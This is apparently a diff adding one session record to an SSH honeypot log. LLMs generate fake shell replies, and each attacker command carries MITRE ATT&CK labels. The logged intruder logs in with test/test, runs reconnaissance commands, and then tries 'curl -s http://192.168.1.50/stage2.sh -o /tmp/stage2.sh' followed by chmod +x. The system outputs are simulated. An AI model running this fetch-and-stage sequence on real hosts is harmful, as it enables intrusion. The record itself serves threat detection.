@@ -1,5 +1,209 @@
 [
   {
+    "SessionId": "598c041e19ae4bd6",
+    "StartedAt": "2026-09-04T12:21:12.7572849Z",
+    "EndedAt": "2026-09-04T12:21:32.4053588Z",
+    "DurationSeconds": 19.65,
+    "RemoteEndpoint": "172.18.0.3:40594",
+    "RemoteIp": "172.18.0.3",
+    "Username": "test",
+    "ClientVersion": "pending",
+    "SshBanner": "SSH-2.0-OmegaBlack_Classified_Server_v1.0",
+    "AuthAccepted": true,
+    "AuthAttempts": [
+      {
+        "Username": "test",
+        "Password": "test",
+        "Accepted": true,
+        "Timestamp": "2026-09-04T12:21:12.8209265Z"
+      }
+    ],
+    "ShellOpened": true,
+    "TimeToCompromiseMs": 73,
+    "CommandCount": 10,
+    "Commands": [
+      {
+        "Sequence": 4,
+        "ExchangeId": "598c041e19ae4bd6:000001",
+        "Command": "whoami",
+        "Timestamp": "2026-09-04T12:21:12.8881388Z",
+        "Response": "remote",
+        "ResponseDurationMs": 3,
+        "FailedCommand": false,
+        "LlmModel": null,
+        "ResponseSource": "cache",
+        "MitreTactics": [
+          "Execution",
+          "Discovery"
+        ],
+        "MitreTechnique": "T1033 System Owner/User Discovery",
+        "InferredObjective": "Identify current user privileges, groups, and security context"
+      },
+      {
+        "Sequence": 6,
+        "ExchangeId": "598c041e19ae4bd6:000002",
+        "Command": "uname -a",
+        "Timestamp": "2026-09-04T12:21:13.9648049Z",
+        "Response": "Linux omegablack 2.6.32-5-amd64 #1 SMP Mon Jan 16 16:22:28 UTC 2012 x86_64 GNU/Linux",
+        "ResponseDurationMs": 0,
+        "FailedCommand": false,
+        "LlmModel": null,
+        "ResponseSource": "cache",
+        "MitreTactics": [
+          "Execution",
+          "Discovery"
+        ],
+        "MitreTechnique": "T1082 System Information Discovery",
+        "InferredObjective": "Determine Linux kernel version, OS release, and CPU architecture"
+      },
+      {
+        "Sequence": 8,
+        "ExchangeId": "598c041e19ae4bd6:000003",
+        "Command": "cat /proc/cpuinfo | grep model | head -n 1",
+        "Timestamp": "2026-09-04T12:21:15.026388Z",
+        "Response": "model\t\t: 85",
+        "ResponseDurationMs": 1486,
+        "FailedCommand": false,
+        "LlmModel": "openai/gpt-5.6-luna",
+        "ResponseSource": "llm",
+        "MitreTactics": [
+          "Execution"
+        ],
+        "MitreTechnique": "T1082 System Information Discovery",
+        "InferredObjective": "Profile host hardware capabilities, RAM, and distribution baseline"
+      },
+      {
+        "Sequence": 10,
+        "ExchangeId": "598c041e19ae4bd6:000004",
+        "Command": "df -h",
+        "Timestamp": "2026-09-04T12:21:17.5650315Z",
+        "Response": "Filesystem      Size  Used Avail Use% Mounted on\n/dev/sda1       49G  7.9G   39G  17% /\ntmpfs          3.9G     0  3.9G   0% /dev/shm\n/dev/sda2      197G   44G  143G  24% /home",
+        "ResponseDurationMs": 0,
+        "FailedCommand": false,
+        "LlmModel": null,
+        "ResponseSource": "cache",
+        "MitreTactics": [
+          "Execution",
+          "Discovery"
+        ],
+        "MitreTechnique": "T1082 System Information Discovery",
+        "InferredObjective": "Inspect mounted filesystems, disk utilization, and storage partitions"
+      },
+      {
+        "Sequence": 12,
+        "ExchangeId": "598c041e19ae4bd6:000005",
+        "Command": "cat /etc/issue",
+        "Timestamp": "2026-09-04T12:21:18.6293657Z",
+        "Response": "Debian GNU/Linux 6.0 \\n \\l",
+        "ResponseDurationMs": 1055,
+        "FailedCommand": false,
+        "LlmModel": "openai/gpt-5.6-luna",
+        "ResponseSource": "llm",
+        "MitreTactics": [
+          "Execution"
+        ],
+        "MitreTechnique": "T1082 System Information Discovery",
+        "InferredObjective": "Profile host hardware capabilities, RAM, and distribution baseline"
+      },
+      {
+        "Sequence": 14,
+        "ExchangeId": "598c041e19ae4bd6:000006",
+        "Command": "ps aux | head -n 5",
+        "Timestamp": "2026-09-04T12:21:20.7476779Z",
+        "Response": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\r\nroot         1  0.0  0.1  10324   688 ?        Ss   Jan08   0:03 init [2]\r\nroot       412  0.0  0.2  52760  2148 ?        Ss   Jan08   0:12 /usr/sbin/sshd -D\r\nroot       587  0.0  0.3  68432  3260 ?        S    Jan08   0:08 /usr/sbin/cron\r\nroot       633  0.0  0.4  91240  4312 ?        Ssl  Jan08   1:42 /usr/sbin/rsyslogd -c4",
+        "ResponseDurationMs": 2482,
+        "FailedCommand": false,
+        "LlmModel": "openai/gpt-5.6-luna",
+        "ResponseSource": "llm",
+        "MitreTactics": [
+          "Execution",
+          "Discovery"
+        ],
+        "MitreTechnique": "T1057 Process Discovery",
+        "InferredObjective": "Inspect running processes, background services, and security monitors"
+      },
+      {
+        "Sequence": 16,
+        "ExchangeId": "598c041e19ae4bd6:000007",
+        "Command": "which wget curl gcc python",
+        "Timestamp": "2026-09-04T12:21:24.2837428Z",
+        "Response": "/usr/bin/wget\r\n/usr/bin/curl\r\n/usr/bin/gcc\r\n/usr/bin/python",
+        "ResponseDurationMs": 994,
+        "FailedCommand": false,
+        "LlmModel": "openai/gpt-5.6-luna",
+        "ResponseSource": "llm",
+        "MitreTactics": [
+          "Execution"
+        ],
+        "MitreTechnique": "T1105 Ingress Tool Transfer",
+        "InferredObjective": "Download external payload, staging script, or crypto-mining binary"
+      },
+      {
+        "Sequence": 18,
+        "ExchangeId": "598c041e19ae4bd6:000008",
+        "Command": "crontab -l",
+        "Timestamp": "2026-09-04T12:21:26.3327131Z",
+        "Response": "# m h  dom mon dow   command\r\n17 3 * * * /usr/local/bin/health-check.sh\r\n*/15 * * * * /opt/monitoring/collect.sh\r\n0 4 * * 0 /usr/local/bin/rotate-keys\r\n30 2 * * * /home/remote/.local/bin/sync-agent --quiet\r\n*/5 * * * * /tmp/.cache/.sysupdate --background",
+        "ResponseDurationMs": 0,
+        "FailedCommand": false,
+        "LlmModel": "openai/gpt-5.6-luna",
+        "ResponseSource": "cache",
+        "MitreTactics": [
+          "Execution",
+          "Persistence"
+        ],
+        "MitreTechnique": "T1053.003 Scheduled Task/Job: Cron",
+        "InferredObjective": "Inspect or establish recurring persistence via scheduled cron jobs"
+      },
+      {
+        "Sequence": 20,
+        "ExchangeId": "598c041e19ae4bd6:000009",
+        "Command": "curl -s http://192.168.1.50/stage2.sh -o /tmp/stage2.sh",
+        "Timestamp": "2026-09-04T12:21:27.3914786Z",
+        "Response": "curl: (7) couldn\u0027t connect to host",
+        "ResponseDurationMs": 1774,
+        "FailedCommand": false,
+        "LlmModel": "nvidia/nemotron-3-super-120b-a12b:free",
+        "ResponseSource": "llm",
+        "MitreTactics": [
+          "Execution",
+          "Command and Control"
+        ],
+        "MitreTechnique": "T1105 Ingress Tool Transfer",
+        "InferredObjective": "Download external payload, staging script, or crypto-mining binary"
+      },
+      {
+        "Sequence": 22,
+        "ExchangeId": "598c041e19ae4bd6:000010",
+        "Command": "chmod \u002Bx /tmp/stage2.sh",
+        "Timestamp": "2026-09-04T12:21:30.2212208Z",
+        "Response": "chmod: cannot access \u0060/tmp/stage2.sh\u0027: No such file or directory",
+        "ResponseDurationMs": 1112,
+        "FailedCommand": true,
+        "LlmModel": "openai/gpt-5.6-luna",
+        "ResponseSource": "llm",
+        "MitreTactics": [
+          "Execution"
+        ],
+        "MitreTechnique": "T1222 File Permission Modification",
+        "InferredObjective": "Grant execution permissions to staged dropped binaries or scripts"
+      }
+    ],
+    "TacticsObserved": [
+      "Execution",
+      "Discovery",
+      "Persistence",
+      "Command and Control"
+    ],
+    "PayloadUrls": [
+      "http://192.168.1.50/stage2.sh"
+    ],
+    "PersistenceVectors": [
+      "cron"
+    ],
+    "RiskScore": 105
+  },
+  {
     "SessionId": "015756f25bb84b14",
     "StartedAt": "2026-09-04T12:20:25.3582185Z",
     "EndedAt": "2026-09-04T12:20:26.083078Z",
